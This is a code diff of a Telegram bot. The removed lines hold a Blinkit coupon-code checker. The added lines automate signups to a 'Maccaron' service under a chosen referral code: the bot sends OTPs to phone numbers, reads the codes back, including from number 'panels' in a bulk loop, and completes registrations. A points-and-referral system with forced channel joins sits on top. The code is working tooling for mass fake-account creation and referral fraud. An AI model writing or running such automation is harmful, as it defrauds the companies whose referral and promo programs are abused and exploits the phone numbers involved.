-        BOT.send_message(chat_id, "❌ Pehle /blinkitlogin karo.", parse_mode="HTML")
-        return
-    m = BOT.send_message(chat_id, f"🔍 Checking <code>{code}</code>...", parse_mode="HTML")
-    try:
-        status, line = check_code_with_blinkit(code)
-    except Exception as exc:
-        status, line = "ERROR", str(exc)
-    result = (f"🎟️ Code: <code>{html.escape(code)}</code>\n"
-              f"🛒 Result: {line}\n"
-              f"📊 Session total: {BLINKIT_STATS['checked']} checked | "
-              f"✅ {BLINKIT_STATS['valid']} | ⚠️ {BLINKIT_STATS['potential']} | "
-              f"❌ {BLINKIT_STATS['invalid']} | 🔴 {BLINKIT_STATS['errors']}")
-    try:
-        BOT.edit_message_text(result, chat_id=chat_id, message_id=m.message_id, parse_mode="HTML")
-    except Exception:
-        BOT.send_message(chat_id, result, parse_mode="HTML")
-
-
-@BOT.message_handler(commands=["blinkit"])
-def admin_blinkit_status(message):
-    chat_id = message.chat.id
-    if not is_admin(message.from_user.id):
-        return
-    BOT.send_message(
-        chat_id,
-        f"🛒 <b>BLINKIT CHECKER STATUS</b>\n\n"
-        f"🔐 Session: {blinkit_status_line()}\n"
-        f"📊 Checked: <b>{BLINKIT_STATS['checked']}</b>\n"
-        f"✅ Valid: <b>{BLINKIT_STATS['valid']}</b>\n"
-        f"⚠️ Potential: <b>{BLINKIT_STATS['potential']}</b>\n"
-        f"❌ Invalid: <b>{BLINKIT_STATS['invalid']}</b>\n"
-        f"🔴 Errors: <b>{BLINKIT_STATS['errors']}</b>\n\n"
-        f"Commands:\n"
-        f"<code>/blinkitlogin</code> - login\n"
-        f"<code>/check CODE</code> - manual check\n"
-        f"<code>/blinkit</code> - checker stats",
-        parse_mode="HTML",
-    )
-
-
-@BOT.message_handler(commands=["codes"])
-def admin_codes(message):
-    chat_id = message.chat.id
-    if not is_admin(message.from_user.id):
-        return
-    BOT.send_message(chat_id, "🔒 <b>Codes private hain</b> — har user apne codes "
-                              "sirf khud dekh sakta hai. Admin sirf counts dekhta hai "
-                              "(/user).", parse_mode="HTML")
-
-
-# ═══════════════════════════════════════════════════════════════
-# MAIN
-# ═══════════════════════════════════════════════════════════════
-
-def main():
-    if not BOT_TOKEN:
-        print("ERROR: BOT_TOKEN env var required")
-        sys.exit(1)
-    global BOT_USERNAME
-    init_db()
-    try:
-        me = BOT.get_me()
-        BOT_USERNAME = me.username
-    except Exception:
-        BOT_USERNAME = "autoblinkitbot"
-    print(f"[ViedietBot] running | bot=@{BOT_USERNAME} | admins={ADMIN_IDS}")
-    mirror = os.getenv("TELEGRAM_API", "").strip().rstrip("/")
-    if mirror:
-        apihelper.API_URL = mirror + "/bot{0}/{1}"
-        print(f"[ViedietBot] telegram API mirror = {mirror}")
-    poll_interval = 5
-    while True:
-        try:
-            BOT.polling(
-                non_stop=False,
-                timeout=25,
-                long_polling_timeout=20,
-                skip_pending=True,
-            )
-            break
-        except KeyboardInterrupt:
-            print("\n[Bot] stopping...")
-            break
-        except telebot.apihelper.ApiTelegramException as exc:
-            if exc.error_code == 409:
-                print(f"[Bot] conflict: {exc} - retry {poll_interval}s")
+        tg_send(chat_id, f"📡 Panel <b>{panel['tag']}</b>: {len(nums)} number(s) found")
+        for dev_id, number in nums:
+            if AUTO_STOP_REQUESTED["v"]:
+                break
+            if max_count and total >= max_count:
+                break
+            total += 1
+            res = do_send_otp(number, referral_code, user_id)
+            if res.get("status") != "otp_sent":
+                fail += 1
+                continue
+            otp = fb_fetch_otp(panel, dev_id, timeout=30)
+            if not otp:
+                fail += 1
+                tg_send(chat_id, f"⏳ OTP not received for <code>{number}</code>")
+                continue
+            sign = do_verify_and_signup(number, referral_code, otp, user_id)
+            if sign.get("status") == "success":
+                ok += 1
+                tg_send(chat_id, f"✅ <code>{number}</code> registered")
             else:
-                print(f"[Bot] Telegram API error {exc.error_code}: {exc} - retry {poll_interval}s")
-        except Exception as exc:
-            print(f"[Bot] polling error ({type(exc).__name__}: {exc}) - retry {poll_interval}s")
-        time.sleep(poll_interval)
-        poll_interval = min(poll_interval + 5, 60)
+                fail += 1
+                tg_send(chat_id, f"❌ <code>{number}</code>: {sign.get('reason', '?')}")
+            time.sleep(1)
+    AUTO_RUNNING["v"] = False
+    AUTO_STOP_REQUESTED["v"] = False
+    tg_send(chat_id,
+            f"🏁 <b>Automation Finished</b>\nTotal: {total} | ✅ {ok} | ❌ {fail}")
+
+def main_menu_keyboard():
+    return InlineKeyboardMarkup([
+        [green("📱 Register Number", cdata="action_register")],
+        [blue("🎁 Referral Program", cdata="action_refer")],
+        [grey("📊 My Stats", cdata="action_stats"), grey("📋 History", cdata="action_recent")],
+        [grey("🔑 Change Maccaron Code", cdata="action_change_mc")],
+        [grey("✏️ Change Link Code", cdata="action_change_pc")],
+        [red("❓ Help & Guide", cdata="action_help")],
+    ])
+
+
+def back_button():
+    return InlineKeyboardMarkup([[grey("🔙 Back to Menu", cdata="action_back_to_menu")]])
+
+
+def admin_menu_keyboard():
+    return InlineKeyboardMarkup([
+        [blue("📊 Global Stats", cdata="admin_stats")],
+        [green("📢 Broadcast", cdata="admin_broadcast")],
+        [grey("👥 List Users", cdata="admin_listusers")],
+        [red("🔄 Reset User", cdata="admin_resetuser")],
+        [grey("🔙 Back to Main", cdata="admin_back")],
+    ])
+
+
+def back_or_skip(extra=None):
+    rows = []
+    if extra:
+        rows.append(extra)
+    rows.append([grey("🔙 Back to Menu", cdata="action_back_to_menu")])
+    return InlineKeyboardMarkup(rows)
+
+
+def captcha_keyboard(opts):
+    row = []
+    for i, opt in enumerate(opts):
+        row.append(grey(str(opt), cdata=f"cap:{opt}"))
+    kb = [row]
+    kb.append([red("❌ Cancel", cdata="action_cancel_captcha")])
+    return InlineKeyboardMarkup(kb)
+
+
+# ════════════════════════════════════════════════════════════════════
+#  REFERRAL LINK + ARG PARSING
+# ════════════════════════════════════════════════════════════════════
+def refer_link(user_id):
+    code = get_user(user_id)["personal_code"]
+    return f"https://t.me/{BOT_USERNAME}?start=ref_{code}"
+
+
+def resolve_ref_arg(arg):
+    """Deep-link arg se referrer user_id nikaalo. Backward-compat:
+    ref_<digits> = user_id, warna personal code se lookup."""
+    if not arg:
+        return None
+    a = str(arg).strip()
+    for p in ("ref_", "REF_", "Ref_"):
+        if a.startswith(p):
+            a = a[len(p):]
+            break
+    if not a:
+        return None
+    if a.isdigit() and get_user(a):
+        return str(a)
+    u = get_user_by_code(a)
+    return str(u["user_id"]) if u else None
+
+
+# ════════════════════════════════════════════════════════════════════
+#  HANDLERS
+# ════════════════════════════════════════════════════════════════════
+async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    if update.effective_user is None:
+        return ConversationHandler.END
+    user = update.effective_user
+    user_id = str(user.id)
+
+    referrer_id = resolve_ref_arg(context.args[0] if context.args else None)
+
+    existing = get_user(user_id)
+    if existing is None:
+        create_user(user_id, user.username or "", user.full_name or "", referred_by=referrer_id or "")
+        if referrer_id:
+            add_referral(referrer_id, user_id)
+
+    update_user(user_id, username=user.username or "", full_name=user.full_name or "",
+                last_active=time.time())
+
+    # ADMIN: full access — skip channel join + captcha, go straight to menu
+    if is_admin(user_id):
+        update_user(user_id, channel_ok=1, captcha_ok=1)
+        return await show_main_menu(update, context, user_id)
+
+    # STEP 1 — forced channel join
+    not_joined = await check_channel_joins(context.bot, user.id)
+    if not_joined:
+        names = "\n".join(f"• {ch['title']}" for ch in not_joined)
+        await update.message.reply_text(
+            "🔒 <b>STEP 1/4 — Join Required Channel</b>\n\n"
+            f"You must join the following channel(s) to continue:\n{names}\n\n"
+            "Join all of them, then tap <b>✅ I've Joined</b> so the bot can verify.",
+            parse_mode="HTML",
+            reply_markup=channel_join_keyboard(),
+        )
+        return CHANNEL_CHECK
+
+    update_user(user_id, channel_ok=1)
+
+    # STEP 2 — captcha gate (agar pehle se pass nahi)
+    u = get_user(user_id)
+    if not u["captcha_ok"]:
+        return await show_captcha(update, context, user_id)
+
+    # Already onboarded → main menu
+    return await show_main_menu(update, context, user_id)
+
+
+async def show_captcha(update, context, user_id, edit=False):
+    u = get_user(user_id)
+    if u and u["captcha_locked_until"] and time.time() < u["captcha_locked_until"]:
+        mins = int((u["captcha_locked_until"] - time.time()) // 60) + 1
+        text = f"🚫 <b>Too many wrong attempts!</b>\n\nTry again in <b>{mins} min</b>."
+        if edit:
+            await update.callback_query.edit_message_text(text, parse_mode="HTML")
+        else:
+            await update.message.reply_text(text, parse_mode="HTML")
+        return ConversationHandler.END
+
+    op, a, b, ans, opts = make_captcha()
+    context.user_data["captcha"] = ans
+    context.user_data["captcha_op"] = (op, a, b)
+    text = (
+        "🧮 <b>STEP 2/4 — Human Verification</b>\n\n"
+        f"Please solve this simple math to prove you're human:\n\n"
+        f"🔢 <b>{a} {op} {b} = ?</b>\n\n"
+        "Tap the correct answer. (3 wrong attempts = 10 min lock)"
+    )
+    kb = captcha_keyboard(opts)
+    if edit and update.callback_query:
+        await update.callback_query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
+    else:
+        await update.message.reply_text(text, parse_mode="HTML", reply_markup=kb)
+    return CAPTCHA
+
+
+async def show_main_menu(update, context, user_id, edit=False):
+    u = get_user(user_id)
+    name = u["full_name"] or "there"
+    text = (
+        f"👋 <b>Welcome back, {name}!</b>\n\n"
+        f"💳 <b>Points:</b> <code>{points_display(user_id)}</code>\n"
+        f"🔑 <b>Maccaron Code:</b> <code>{u['maccaron_code'] or 'Not set'}</code>\n"
+        f"👥 <b>Referrals:</b> {u['referral_count']}\n\n"
+        "What would you like to do?"
+    )
+    if edit and update.callback_query:
+        await update.callback_query.edit_message_text(text, parse_mode="HTML",
+                                                       reply_markup=main_menu_keyboard())
+    else:
+        await update.message.reply_text(text, parse_mode="HTML",
+                                        reply_markup=main_menu_keyboard())
+    return PHONE
+
+
+# ── channel check callback ──
+async def handle_channel_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    query = update.callback_query
+    await query.answer()
+    user_id = str(query.from_user.id)
+
+    not_joined = await check_channel_joins(context.bot, query.from_user.id)
+    if not_joined:
+        names = "\n".join(f"• {ch['title']}" for ch in not_joined)
+        await query.edit_message_text(
+            "🔒 <b>Still missing channels:</b>\n" + names + "\n\nJoin them and try again.",
+            parse_mode="HTML",
+            reply_markup=channel_join_keyboard(),
+        )
+        return CHANNEL_CHECK
+
+    update_user(user_id, channel_ok=1)
+    return await show_captcha(update, context, user_id, edit=True)
+
+
+# ── captcha callback ──
+async def handle_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    query = update.callback_query
+    await query.answer()
+    user_id = str(query.from_user.id)
+    data = query.data
+
+    if data == "action_cancel_captcha":
+        await query.edit_message_text("❌ Captcha cancelled. Send /start to try again.")
+        return ConversationHandler.END
+
+    answer = context.user_data.get("captcha")
+    if answer is None:
+        await query.edit_message_text("⏳ Session expired. Send /start.", reply_markup=main_menu_keyboard())
+        return PHONE
+
+    try:
+        chosen = int(data.split(":")[1])
+    except Exception:
+        await query.edit_message_text("❌ Invalid option. Send /start.")
+        return ConversationHandler.END
+
+    if chosen == answer:
+        update_user(user_id, captcha_ok=1, captcha_fails=0)
+        u = get_user(user_id)
+        # referral credit (referee ke captcha complete = confirmed friend)
+        referrer = credit_referral(user_id)
+        if referrer:
+            ref_u = get_user(referrer)
+            try:
+                await context.bot.send_message(
+                    chat_id=int(referrer),
+                    text=(
+                        "🎉 <b>New Referral Confirmed!</b>\n\n"
+                        "A friend joined via your link and completed verification.\n"
+                        f"➕ <b>+{REFERRAL_POINTS} points</b> added.\n"
+                        f"💳 Your balance: <b>{ref_u['points']} points</b>"
+                    ),
+                    parse_mode="HTML",
+                )
+            except Exception as e:
+                logger.error(f"Referral notify failed: {e}")
+        # initial points sirf pehli baar (no maccaron code yet)
+        if not u["maccaron_code"]:
+            add_points(user_id, INITIAL_POINTS)
+
+        if not u["maccaron_code"]:
+            await query.edit_message_text(
+                "✅ <b>Captcha passed! Human verified.</b>\n\n"
+                f"🎁 You received <b>+{INITIAL_POINTS} free points</b>!\n\n"
+                "Now <b>STEP 3/4</b> — enter your <b>Maccaron Referral Code</b>\n"
+                "(the code used to register others under your account).",
+                parse_mode="HTML",
+                reply_markup=back_button(),
+            )
+            return REFERRAL
+
+        await query.edit_message_text(
+            "✅ <b>Captcha passed! Human verified.</b>\n\nAccess unlocked. 🎉",
+            parse_mode="HTML",
+        )
+        return await show_main_menu(update, context, user_id, edit=True)
+    else:
+        fails = (get_user(user_id) or {}).get("captcha_fails", 0) + 1
+        update_user(user_id, captcha_fails=fails)
+        if fails >= CAPTCHA_MAX_FAILS:
+            locked_until = time.time() + CAPTCHA_LOCK_SECONDS
+            update_user(user_id, captcha_locked_until=locked_until)
+            mins = CAPTCHA_LOCK_SECONDS // 60
+            await query.edit_message_text(
+                f"🚫 <b>Wrong answer!</b>\n\n{max(CAPTCHA_MAX_FAILS,0)} wrong attempts — locked for <b>{mins} min</b>.\n"
+                "Send /start to try again later.",
+                parse_mode="HTML",
+            )
+            return ConversationHandler.END
+        return await show_captcha(update, context, user_id, edit=True)
+
+
+# ── STEP 3: maccaron refer code (text) ──
+async def handle_referral(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    user_id = str(update.effective_user.id)
+    text = update.message.text.strip().upper()
+
+    if not re.fullmatch(r"[A-Z0-9]{4,20}", text):
+        await update.message.reply_text(
+            "❌ Invalid code. Use only letters/digits, 4-20 characters.\n"
+            "Enter your Maccaron Referral Code:",
+            reply_markup=back_button(),
+        )
+        return REFERRAL
+
+    update_user(user_id, maccaron_code=text)
+    await update.message.reply_text(
+        f"✅ <b>Maccaron Code saved:</b> <code>{text}</code>\n\n"
+        "🎉 <b>Access unlocked!</b>\n\n"
+        f"💳 <b>Your points:</b> {get_user(user_id)['points']}\n"
+        f"🔗 <b>Your link:</b> <code>{refer_link(user_id)}</code>\n\n"
+        "📱 Send a phone number to register, or use the menu.",
+        parse_mode="HTML",
+        reply_markup=main_menu_keyboard(),
+    )
+    return PHONE
+
+
+# ── STEP 4: phone ──
+async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    user_id = str(update.effective_user.id)
+    text = update.message.text.strip().replace("+", "").replace(" ", "")
+
+    if not text.isdigit() or len(text) < 10:
+        await update.message.reply_text(
+            "❌ Invalid phone. Send digits including country code.\n"
+            "Example: 919876543210",
+            reply_markup=back_button(),
+        )
+        return PHONE
+
+    u = get_user(user_id)
+    if not u["captcha_ok"]:
+        await update.message.reply_text("🔒 Complete the captcha first. Send /start")
+        return ConversationHandler.END
+
+    ok, points = can_use(user_id)
+    if not ok:
+        await update.message.reply_text(
+            "⛔ <b>No points left!</b>\n\n"
+            "Each registration costs 1 point.\n"
+            "Refer friends to earn more points 👇\n\n"
+            f"🔗 <code>{refer_link(user_id)}</code>\n"
+            f"Each friend (join + captcha) = <b>+{REFERRAL_POINTS} points</b>",
+            parse_mode="HTML",
+            reply_markup=main_menu_keyboard(),
+        )
+        return PHONE
+
+    if get_user_phone_status(user_id, text) == "success":
+        await update.message.reply_text(
+            f"⚠️ Phone <code>{text}</code> is already registered under your account.\n"
+            "Try a different number.",
+            parse_mode="HTML",
+            reply_markup=back_button(),
+        )
+        return PHONE
+
+    context.user_data["phone"] = text
+    referral_code = u["maccaron_code"] or ""
+
+    msg = await update.message.reply_text(
+        f"📤 Sending OTP to <code>{text[-10:]}</code>...",
+        parse_mode="HTML",
+    )
+    loop = asyncio.get_event_loop()
+    result = await loop.run_in_executor(IO_POOL, do_send_otp, text, referral_code, user_id)
+
+    if result["status"] != "otp_sent":
+        await msg.edit_text(
+            f"❌ Could not send OTP: {result.get('reason', 'Unknown')}\n\n"
+            "Try a different number.",
+            reply_markup=back_button(),
+        )
+        return PHONE
+
+    await msg.edit_text(
+        f"✅ OTP sent to <code>{text[-10:]}</code>!\n\n"
+        "Enter the OTP you received (4 or 6 digits).\n"
+        "Type <b>skip</b> to change the number.",
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([
+            [blue("⏩ Skip Number", cdata="action_skip_otp")],
+            [grey("🔙 Back to Menu", cdata="action_back_to_menu")],
+        ]),
+    )
+    return OTP
+
+
+async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    user_id = str(update.effective_user.id)
+    text = update.message.text.strip()
+
+    if text.lower() == "skip":
+        context.user_data.pop("phone", None)
+        await update.message.reply_text(
+            "⏩ Skipped. Send a new number:",
+            reply_markup=main_menu_keyboard(),
+        )
+        return PHONE
+
+    if not text.isdigit() or len(text) not in (4, 6):
+        await update.message.reply_text(
+            "❌ Invalid OTP. Must be 4 or 6 digits.\n"
+            "Enter OTP, or type 'skip' to change the number:",
+            reply_markup=back_button(),
+        )
+        return OTP
+
+    phone = context.user_data.get("phone")
+    u = get_user(user_id)
+    if not phone:
+        await update.message.reply_text("⚠️ Session expired. Send /start.")
+        return ConversationHandler.END
+    if not u or not u["captcha_ok"]:
+        await update.message.reply_text("🔒 Captcha verification incomplete. Send /start")
+        return ConversationHandler.END
+    ok, _ = can_use(user_id)
+    if not ok:
+        await update.message.reply_text("⛔ Out of points. Refer friends to earn points.", parse_mode="HTML",
+                                        reply_markup=main_menu_keyboard())
+        return PHONE
+
+    referral_code = u["maccaron_code"] or ""
+    msg = await update.message.reply_text("⏳ Verifying OTP and signing up...")
+
+    loop = asyncio.get_event_loop()
+    result = await loop.run_in_executor(IO_POOL, do_verify_and_signup,
+                                        phone, referral_code, text, user_id)
+
+    if result["status"] == "success":
+        consume_point(user_id)
+        my_success = get_user_success_count(user_id)
+        balance = get_user(user_id)["points"]
+        await msg.edit_text(
+            "🎉 <b>REGISTRATION SUCCESSFUL!</b>\n\n"
+            f"📱 Phone: <code>{phone}</code>\n"
+            f"👤 Name: {result.get('name', 'N/A')}\n"
+            f"📧 Email: {result.get('email', 'N/A')}\n"
+            f"🆔 Maccaron ID: {result.get('user_maccaron_id', 'N/A')}\n"
+            f"🔑 Refer Code Used: <code>{referral_code}</code>\n\n"
+            f"✅ Total registrations: <b>{my_success}</b>\n"
+            f"💳 Points left: <b>{balance}</b>\n\n"
+            "Send another number, or use the menu to refer friends!",
+            parse_mode="HTML",
+            reply_markup=main_menu_keyboard(),
+        )
+    else:
+        await msg.edit_text(
+            "❌ <b>Registration failed</b>\n\n"
+            f"📱 Phone: <code>{phone}</code>\n"
+            f"Reason: {result.get('reason', 'Unknown')}\n\n"
+            "Try a different number.",
+            parse_mode="HTML",
+            reply_markup=main_menu_keyboard(),
+        )
+
+    context.user_data.pop("phone", None)
+    return PHONE
+
+
+# ── change code handlers ──
+async def handle_change_mc(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    user_id = str(update.effective_user.id)
+    text = update.message.text.strip().upper()
+    if not re.fullmatch(r"[A-Z0-9]{4,20}", text):
+        await update.message.reply_text("❌ Invalid code (4-20 letters/digits).", reply_markup=back_button())
+        return CHANGE_MC
+    update_user(user_id, maccaron_code=text)
+    await update.message.reply_text(f"✅ Maccaron Code updated: <code>{text}</code>",
+                                    parse_mode="HTML", reply_markup=main_menu_keyboard())
+    return PHONE
+
+
+
+
+async def handle_change_pc(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    user_id = str(update.effective_user.id)
+    text = update.message.text.strip().upper()
+    if not re.fullmatch(r"[A-Z0-9]{3,12}", text):
+        await update.message.reply_text(
+            "❌ Code must be 3-12 characters, letters/digits only.\nExample: VIEDBRO",
+            reply_markup=back_button())
+        return CHANGE_PC
+    other = get_user_by_code(text)
+    if other and other["user_id"] != user_id:
+        await update.message.reply_text(
+            "❌ This code is already taken by another user. Choose a new one:",
+            reply_markup=back_button())
+        return CHANGE_PC
+    update_user(user_id, personal_code=text)
+    await update.message.reply_text(
+        f"✅ Your new referral link code: <code>{text}</code>\n\n"
+        f"🔗 <b>{refer_link(user_id)}</b>\n\n"
+        "Friends who join via this link will earn you points!",
+        parse_mode="HTML",
+        reply_markup=main_menu_keyboard(),
+    )
+    return PHONE
+
+
+# ── global callback (menu) ──
+async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    query = update.callback_query
+    await query.answer()
+    user_id = str(query.from_user.id)
+    data = query.data
+
+    # captcha data handled separately but route here too (safety)
+    if data.startswith("cap:"):
+        return await handle_captcha(update, context)
+
+    if data == "action_check_joined":
+        return await handle_channel_check(update, context)
+
+    if data == "action_back_to_start":
+        await query.edit_message_text("🔙 Send /start to begin again.")
+        return ConversationHandler.END
+
+    if data == "action_cancel_captcha":
+        await query.edit_message_text("❌ Cancelled. Send /start to try again.")
+        return ConversationHandler.END
+
+    if data == "action_back_to_menu":
+        u = get_user(user_id)
+        if not u or not u["captcha_ok"]:
+            await query.edit_message_text("🔒 Please join the channel and complete captcha first. Send /start")
+            return ConversationHandler.END
+        return await show_main_menu(update, context, user_id, edit=True)
+
+    if data == "action_skip_otp":
+        context.user_data.pop("phone", None)
+        await query.edit_message_text("⏩ Skipped. Send a new number:", reply_markup=main_menu_keyboard())
+        return PHONE
+
+    if data == "action_register":
+        u = get_user(user_id)
+        if not u or not u["captcha_ok"]:
+            await query.edit_message_text("🔒 Complete channel join + captcha first via /start.")
+            return ConversationHandler.END
+        ok, points = can_use(user_id)
+        if not ok:
+            await query.edit_message_text(
+                "⛔ <b>No points left!</b>\n\nRefer friends to earn:\n\n"
+                f"🔗 <code>{refer_link(user_id)}</code>\n"
+                f"Each friend = <b>+{REFERRAL_POINTS} points</b>",
+                parse_mode="HTML", reply_markup=main_menu_keyboard())
+            return PHONE
+        await query.edit_message_text(
+            f"📱 Send your phone number (with country code).\n"
+            f"Example: 919876543210\n\n💳 Points: <b>{points}</b>",
+            parse_mode="HTML", reply_markup=back_button())
+        return PHONE
+
+    if data == "action_refer":
+        u = get_user(user_id)
+        refs = get_referrals(user_id, limit=10)
+        lines = [f"👥 {r['full_name'] or r['username'] or r['referred_id']}" for r in refs]
+        ref_list = "\n".join(lines) if lines else "None yet"
+        await query.edit_message_text(
+            "<b>🎁 Referral Program</b>\n\n"
+            f"🔗 <b>Your Link:</b>\n<code>{refer_link(user_id)}</code>\n\n"
+            "<b>How it works:</b>\n"
+            "• Friend opens your link and sends /start\n"
+            "• They join the channel + solve captcha\n"
+            f"• You get <b>+{REFERRAL_POINTS} points</b> (usable up to 10 times)\n\n"
+            f"💳 Your points: <b>{points_display(user_id)}</b>\n"
+            f"👥 Referrals: <b>{u['referral_count']}</b>\n\n"
+            "📋 <b>Recent referrals:</b>\n" + ref_list,
+            parse_mode="HTML", reply_markup=main_menu_keyboard())
+        return PHONE
+
+    if data == "action_stats":
+        u = get_user(user_id)
+        my_success = get_user_success_count(user_id)
+        my_total, my_failed = get_user_total_processed(user_id)
+        total_users, global_success, _ = get_global_stats()
+        await query.edit_message_text(
+            "<b>📊 Your Stats</b>\n\n"
+            f"🔑 Maccaron Code: <code>{u['maccaron_code'] or 'Not set'}</code>\n"
+            f"🔗 Refer Code: <code>{u['personal_code']}</code>\n"
+            f"💳 Points: <b>{points_display(user_id)}</b>\n"
+            f"✅ Registrations: <b>{my_success}</b>\n"
+            f"🔄 Total attempts: {my_total}\n"
+            f"❌ Failed: {my_failed}\n"
+            f"👥 Referrals: {u['referral_count']}\n\n"
+            "<b>🌍 Global</b>\n"
+            f"Users: {total_users}\n"
+            f"Total registrations: {global_success}",
+            parse_mode="HTML", reply_markup=main_menu_keyboard())
+        return PHONE
+
+    if data == "action_recent":
+        recent = get_user_recent_phones(user_id, limit=10)
+        if not recent:
+            await query.edit_message_text("📭 No numbers registered yet.",
+                                          reply_markup=main_menu_keyboard())
+            return PHONE
+        lines = ["<b>📋 Recent Numbers</b>\n\n"]
+        for ph, status in recent:
+            icon = "✅" if status == "success" else "❌"
+            lines.append(f"{icon} <code>{ph}</code> — {status}")
+        lines.append("\n\nSend a new number or use the menu.")
+        await query.edit_message_text("\n".join(lines), parse_mode="HTML",
+                                      reply_markup=main_menu_keyboard())
+        return PHONE
+
+    if data == "action_change_mc":
+        await query.edit_message_text(
+            "🔄 Type your new <b>Maccaron Referral Code</b>:",
+            parse_mode="HTML", reply_markup=back_button())
+        return CHANGE_MC
+
+    if data == "action_change_pc":
+        await query.edit_message_text(
+            "✏️ Type your new <b>personal referral link code</b>\n"
+            "(3-12 letters/digits, must be unique):",
+            parse_mode="HTML", reply_markup=back_button())
+        return CHANGE_PC
+
+    if data == "action_help":
+        await query.edit_message_text(
+            "<b>❓ Help & Guide</b>\n\n"
+            "<b>4-Step Flow:</b>\n"
+            "1️⃣ Join required channel\n"
+            "2️⃣ Solve math captcha\n"
+            "3️⃣ Enter your Maccaron referral code\n"
+            "4️⃣ Send phone -> OTP -> Signup\n\n"
+            "<b>Points System:</b>\n"
+            f"• New user = <b>+{INITIAL_POINTS}</b> free points\n"
+            f"• Each referral (friend joins + captcha) = <b>+{REFERRAL_POINTS}</b>\n"
+            f"• Each registration = <b>-{POINTS_PER_USE}</b> point\n\n"
+            "<b>Commands:</b>\n"
+            "/start — Main menu\n"
+            "/stats — Your statistics\n"
+            "/admin — Admin panel (admins only)",
+            parse_mode="HTML", reply_markup=main_menu_keyboard())
+        return PHONE
+
+    # ── admin ──
+    if data.startswith("admin_"):
+        if str(user_id) not in [str(a) for a in ADMIN_IDS]:
+            await query.edit_message_text("⛔ You are not an admin.")
+            return PHONE
+        return await handle_admin_callback(update, context)
+
+    return PHONE
+
+
+# ── admin ──
+async def handle_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    query = update.callback_query
+    data = query.data
+    user_id = str(query.from_user.id)
+
+    if data == "admin_stats":
+        total_users, global_success, total_phones = get_global_stats()
+        await query.edit_message_text(
+            "<b>📊 Global Statistics</b>\n\n"
+            f"Total users: {total_users}\n"
+            f"Total successful registrations: {global_success}\n"
+            f"Total phone entries: {total_phones}",
+            parse_mode="HTML", reply_markup=admin_menu_keyboard())
+        return PHONE
+
+    if data == "admin_broadcast":
+        await query.edit_message_text(
+            "📢 Type the broadcast message.\nSend /cancel to abort.",
+            reply_markup=InlineKeyboardMarkup([[red("❌ Cancel", cdata="admin_back")]]))
+        context.user_data["admin_broadcast"] = True
+        return PHONE
+
+    if data == "admin_listusers":
+        users = get_all_users(limit=20)
+        if not users:
+            await query.edit_message_text("No users found.", reply_markup=admin_menu_keyboard())
+            return PHONE
+        text = "<b>👥 Users (last 20)</b>\n\n"
+        for u in users:
+            cap = "✅" if u["captcha_ok"] else "❌"
+            text += (f"🆔 {u['user_id']}\n"
+                     f"  Ref: {u['personal_code']} | MC: {u['maccaron_code'] or '-'}\n"
+                     f"  Points: {u['points']} | RefC: {u['referral_count']} | Cap: {cap}\n")
+        await query.edit_message_text(text, parse_mode="HTML", reply_markup=admin_menu_keyboard())
+        return PHONE
+
+    if data == "admin_resetuser":
+        await query.edit_message_text(
+            "🔄 Enter the Telegram user ID to reset.",
+            reply_markup=InlineKeyboardMarkup([[red("❌ Cancel", cdata="admin_back")]]))
+        context.user_data["admin_reset"] = True
+        return PHONE
+
+    if data == "admin_back":
+        u = get_user(user_id)
+        if u and u["captcha_ok"]:
+            await query.edit_message_text("🔙 Back to main menu.", reply_markup=main_menu_keyboard())
+        else:
+            await query.edit_message_text("🔙 Back.", reply_markup=admin_menu_keyboard())
+        return PHONE
+
+    if data == "admin_confirm_broadcast":
+        return await admin_confirm_broadcast(update, context)
+
+    return PHONE
+
+
+async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user is None:
+        return
+    if str(update.effective_user.id) not in [str(a) for a in ADMIN_IDS]:
+        await update.message.reply_text("⛔ You are not an admin.")
+        return
+    await update.message.reply_text(
+        "🛠 <b>Admin Panel</b>",
+        parse_mode="HTML",
+        reply_markup=admin_menu_keyboard(),
+    )
+
+
+async def handle_admin_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user is None:
+        return
+    user_id = str(update.effective_user.id)
+    if user_id not in [str(a) for a in ADMIN_IDS]:
+        return
+    text = update.message.text
+
+    if context.user_data.get("admin_broadcast"):
+        if text.lower() == "/cancel":
+            context.user_data.pop("admin_broadcast", None)
+            await update.message.reply_text("❌ Broadcast cancelled.", reply_markup=main_menu_keyboard())
+            return
+        context.user_data["admin_broadcast_payload"] = text
+        context.user_data["admin_broadcast"] = False
+        await update.message.reply_text(
+            f"📢 Broadcast:\n\n{text}\n\nConfirm?",
+            reply_markup=InlineKeyboardMarkup([[green("✅ Confirm", cdata="admin_confirm_broadcast")]]))
+        return
+
+    if context.user_data.get("admin_reset"):
+        if text.lower() == "/cancel":
+            context.user_data.pop("admin_reset", None)
+            await update.message.reply_text("❌ Reset cancelled.", reply_markup=main_menu_keyboard())
+            return
+        target = text.strip()
+        if not target.isdigit():
+            await update.message.reply_text("❌ Invalid ID. Send a numeric ID.")
+            return
+        reset_user_session(target)
+        context.user_data.pop("admin_reset", None)
+        await update.message.reply_text(f"✅ User {target} has been reset.", reply_markup=main_menu_keyboard())
+
+
+async def admin_confirm_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    payload = context.user_data.get("admin_broadcast_payload")
+    if not payload:
+        await query.edit_message_text("No broadcast message found.", reply_markup=admin_menu_keyboard())
+        return
+    with _db_lock:
+        conn = _conn()
+        try:
+            users = conn.execute("SELECT user_id FROM users").fetchall()
+        finally:
+            conn.close()
+    count = 0
+    for row in users:
+        try:
+            await context.bot.send_message(chat_id=int(row["user_id"]), text=payload)
+            count += 1
+            await asyncio.sleep(0.05)
+        except Exception as e:
+            logger.error(f"Broadcast to {row['user_id']} failed: {e}")
